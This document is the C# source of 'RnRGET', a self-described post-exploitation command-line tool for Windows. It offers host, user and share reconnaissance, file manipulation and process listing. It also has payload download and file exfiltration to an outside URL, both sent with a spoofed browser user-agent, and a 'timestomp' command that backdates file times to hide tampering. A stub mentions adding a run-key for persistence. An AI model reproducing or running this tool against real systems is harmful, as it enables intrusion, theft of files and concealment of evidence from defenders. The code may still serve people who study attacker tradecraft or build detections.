using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Management;
using System.ComponentModel;
using System.Collections;
using System.Security.Principal;
using System.Net;
using System.IO.Compression;
using System.Text.RegularExpressions;


namespace rnr
{
    class get
    {
        static void Main()
        {
            Console.WriteLine("                                                     __     ");
            Console.WriteLine("                                                    /  |    ");
            Console.WriteLine("  ______   _______    ______    ______    ______   _$$ |_   ");
            Console.WriteLine(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
            Console.WriteLine("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
            Console.WriteLine("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
            Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
            Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
            Console.WriteLine("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
            Console.WriteLine("                              /  \\__$$ |                    ");
            Console.WriteLine("                              $$    $$/                     ");
            Console.WriteLine("                               $$$$$$/                      ");
            Console.WriteLine("\nlittle recon never hurt nobody......");
            help();
            string a = "";
            for (int i = 1; i <= 100; i++)
            {
                Console.Write("\nrnrget$ ");
                a = Console.ReadLine();
                var split = a.Split();
                if (a.Contains("exit"))
                {
                    break;
                }
                else if (a.StartsWith("help") || a.StartsWith("?") || a.StartsWith("-h") || a.StartsWith("options") || a.StartsWith("//?"))
                {
                    help();
                }
                else if (a == "hostinfo")
                {
                    host();
                }
                else if (a == "shares")
                {
                    shares();
                }
                else if (a == "userinfo")
                {
                    user();
                }
                else if (a == "ps")
                {
                    ps();
                }
                else if (a.StartsWith("run"))
                {
                    var path = split[1];
                    //var args = split[2];
                    Process.Start(path);
                }
                else if (a.StartsWith("mv"))
                {
                    var src = split[1];
                    var dest = split[2];
                    mv(src, dest);
                }
                else if (a.StartsWith("cp"))
                {
                    var src = split[1];
                    var dest = split[2];
                    cp(src, dest);
                }
                else if (a.StartsWith("del"))
                {
                    var path = split[1];
                    del(path);
                }
                else if (a.StartsWith("grep"))
                {
                    var pattern = split[1];
                    var path = split[2];
                    grep(pattern, path);
                }
                else if (a.StartsWith("xfil"))
                {
                    var path = split[2];
                    var uri = split[1];
                    xfil(path, uri);
                }
                else if (a.StartsWith("read") || a.StartsWith("cat"))
                {
                    var path = split[1];
                    readfile(path);
                }
                else if (a.StartsWith("ts "))
                {
                    var path = split[1];
                    ts(path);
                }
                else if (a == "clear" || a == "cls")
                {
                    Console.Clear();
                }
                else if (a.StartsWith("dld"))
                {
                    var path = split[2];
                    var uri = split[1];
                    dnld(path, uri);
                }
                else if (a =="pwd")
                {
                    pwd();
                }
                else if (a == "dir" || a == "ls")
                {
                    dir();
                }
                else if (a.Contains("enumdir"))
                {
                    enumdir();
                }
                else if (a.StartsWith("mkdir"))
                {
                    var path = split[1];
                    mkdir(path);
                }
                else if (a == "envar")
                {
                    envar();
                }
                else if (a == "ProcessList")
                {
                    ProcessList();
                }
                else if (a.StartsWith("kill"))
                {
                    var process = split[1];
                    kill(process);
                }
                else if (a == "cd .." || a == "cd..")
                {
                    cdDrop();
                }
                else if (a.Contains("cd C:"))
                {
                    //var split = a.Split();
                    var dir = split[1];
                    System.IO.Directory.SetCurrentDirectory(dir);
                }
                else
                {
                    help();
                }
            }
        }
        public static void host()
        {
            string hostName = Dns.GetHostName();
            string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
            Console.Write("IP: {0}", ip);
            Console.Write("\nHostname: {0}", System.Environment.MachineName);
            Console.Write("\nMAC: ");
            string Query2 = "SELECT * FROM win32_networkadapterconfiguration";
            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(Query2);
            var mac = "";
            foreach (ManagementObject nic in searcher2.Get())
            {
                mac += Convert.ToString(nic.Properties["MACAddress"].Value);
                if (mac.Length <= 17)
                {
                    Console.Write("{0}", mac);
                }

            }
            Console.Write("\nProcessor Count: {0}", System.Environment.ProcessorCount);
            Console.Write("\n64-bit: {0}", System.Environment.Is64BitOperatingSystem);
            Console.Write("\nLogical Drive: {0}", Environment.GetLogicalDrives());
            string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
            UInt64 Capacity = 0;
            foreach (ManagementObject WniPART in searcher.Get())
            {
                Capacity += Convert.ToUInt64(WniPART.Properties["Capacity"].Value);
            }
            Console.Write("\nTotal RAM: {0}", Capacity);
            // add disk size
            // add OS version
        }
        public static void shares()
        {
            var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
            var wql = "select * FROM Win32_Share";
            var searcher = new ManagementObjectSearcher(wmiPath, wql);
            var shares = searcher.Get();
            Console.Write("\nShares:");
            foreach (var share in shares)
            {
                Console.Write("\n{0}", share);
            }
            var wql2 = "select * FROM Win32_MappedLogicalDisk";
            var searcher2 = new ManagementObjectSearcher(wmiPath, wql2);
            var netShares = searcher2.Get();
            if (netShares is null)
            {
                Console.Write("\nNo Mapped Drives!");
            }
            else
            {
                Console.Write("\nMapped Drives:\n");
                foreach (var share2 in netShares)
                {
                    Console.Write("\n{0}");
                }
            }
        }
        public static void user()
        {
            Console.Write("Username: {0}", Environment.UserName);
            Console.Write("\nDomain\\Username: {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                Console.Write("\nAdmin: " + admin);
            }
        }
        public static void ps()
        {
            ProcessList();
        }
        public static void run()
        {
            //Process.Start(path);
        }
        public static void kill(string process)
        {
            Process[] proc = Process.GetProcessesByName(process);
            
        }
        public static void mv(string src, string dest)
        {
            System.IO.File.Move(src, dest);
        }
        public static void cp(string src, string dest)
        {
            System.IO.File.Copy(src, dest);
        }
        public static void del(string path)
        {
            System.IO.File.Delete(path);
        }
        public static void ts(string path)
        {
            System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
            System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
            System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
        }
        public static void mkdir(string dir)
        {
            System.IO.Directory.CreateDirectory(dir);
        }
        public static void archive(string dir)
        {
            // create archive of files within target directory
        }
        public static void xfil(string path, string uri)
        {
            var wc = new System.Net.WebClient();
            Uri u = new Uri(uri);
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            wc.UploadFile(u, path);
        }
        public static void enumdir()
        {
            Console.Write("Path: ");
            string path = Console.ReadLine();
            var files = System.IO.Directory.EnumerateFiles(path);
            var f = "";
            foreach (string file in files)
            {
                f += "\n" + file;
            }
            var directories = System.IO.Directory.EnumerateDirectories(path);
            foreach (string directory in directories)
            {
                f += "\n" + directory;
            }
            var list = f.Split();
            List<string> result = f.Split('\n').ToList();
            result.Sort();
            foreach (var item in result)
            {
                Console.WriteLine(item);
            }
        }
        public static void readfile(string path)
        {
            Console.Write(System.IO.File.ReadAllText(path));
        }
        public static void grep(string pattern, string path)
        {
            var lines = System.IO.File.ReadLines(path);
            foreach (string line in lines)
            {
                if (line.Contains(pattern))
                {
                    Console.WriteLine(line);
                }
            }
        }
        public static void dnld(string path, string uri)
        {
            var wc = new System.Net.WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
            Uri u = new Uri(uri);
            wc.DownloadFile(u, path);
        }
        public static void pwd()
        {
            Console.WriteLine(Environment.CurrentDirectory);
        }
        public static void dir()
        {
            //var files = System.IO.Directory.EnumerateFiles(Environment.CurrentDirectory);
            {
                var files = System.IO.Directory.EnumerateFiles(Environment.CurrentDirectory);
                var f = "";
                foreach (string file in files)
                {
                    f += "\n" + file;
                }
                var directories = System.IO.Directory.EnumerateDirectories(Environment.CurrentDirectory);
                foreach (string directory in directories)
                {
                    f += "\n" + directory;
                }
                var list = f.Split();
                List<string> result = f.Split('\n').ToList();
                result.Sort();
                foreach (var item in result)
                {
                    Console.WriteLine(item);
                }
            }
        }
        public static void cdDrop()
        {
            string directories = Environment.CurrentDirectory;
            var list = directories.Split('\\').ToList();
            list.RemoveAt(list.Count - 1);
            var j = "";
            StringBuilder builder = new StringBuilder();
            foreach (var i in list)
            {
                builder.Append(i);
                builder.Append("\\");
            }
            Console.Write(builder);
            var dir = builder.ToString();
            System.IO.Directory.SetCurrentDirectory(dir);
        }
        public static void gzip()
        {
            // add archive/compression
        }
        public static void persist()
        {
            // add run key 
        }
        public static void envar()
        {
            var envar = Environment.GetEnvironmentVariables();
            foreach(DictionaryEntry i in envar)
            {
                Console.WriteLine("{0}: {1}", i.Key, i.Value);
            }
        }
        public static void ProcessList()
        {
            StringBuilder allProcesses = new StringBuilder();
            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
            Process[] processList = Process.GetProcesses();
            foreach (Process process in processList)
            {
                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
                allProcesses.Append(processInfo);
            }
            Console.Write(allProcesses.ToString());
        }
        public static void help()
        {
            Console.WriteLine("\nRnRGET - post exploit commandline utility by james haughom jr\n");
            Console.WriteLine("Command      Description                 Format");
            Console.WriteLine("-------      -----------                 ------");
            Console.WriteLine("help         display help menu           help, /?, ?");
            Console.WriteLine("cd           change directory            cd .., cd C:\\Users\\Admin\\Desktop");
            Console.WriteLine("clear, cls   clear console window        clear, cls");
            Console.WriteLine("cp           copy files                  cp <source path> <destination path>, cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
            Console.WriteLine("del          delete files                del <target path>, del C:\\Users\\Admin\\targetfile.txt");
            Console.WriteLine("dld          download payloads           dld <URI> <download path>, dld https://raw.githubusercontent.com/rnranalysis/file.dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld");
            Console.WriteLine("enumdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
            Console.WriteLine("exit         exit/terminate process      exit");
            Console.WriteLine("grep         grep files                  grep <pattern> <path>, grep foo bar.txt");
            Console.WriteLine("hostinfo     get host information        hostinfo");
            Console.WriteLine("ls, dir      get files/folders           dir, ls");
            Console.WriteLine("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
            Console.WriteLine("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
            Console.WriteLine("ps           get process listing         ps");
            Console.WriteLine("pwd          get current directory       pwd");
            Console.WriteLine("read, cat    read text from file         readfile <target path>, readfile C:\\Users\\Admin\\helloworld.txt");
            Console.WriteLine("run          run processes               run <target path> <cmdline args>, run calc.exe");
            Console.WriteLine("shares       enumerate shares            shares");
            Console.WriteLine("ts           timestomp                   ts <target path>, ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
            Console.WriteLine("userinfo     get user information        userinfo");
            Console.WriteLine("xfil         exfil files                 xfil <URI> <target path>, xfil https://raw.githubusercontent.com/rnranalysis/xfiol.file C:\\Users\\Admin\\xfil.me");
        }
    }
}
